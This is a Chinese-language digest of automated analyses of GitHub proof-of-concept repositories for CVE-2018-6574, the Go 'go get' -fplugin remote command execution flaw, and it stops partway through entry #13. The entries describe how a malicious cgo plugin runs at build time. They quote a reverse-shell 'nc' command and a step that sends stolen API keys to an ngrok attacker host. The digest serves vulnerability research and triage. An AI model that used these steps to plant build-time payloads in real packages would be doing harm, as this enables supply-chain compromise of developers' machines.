**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
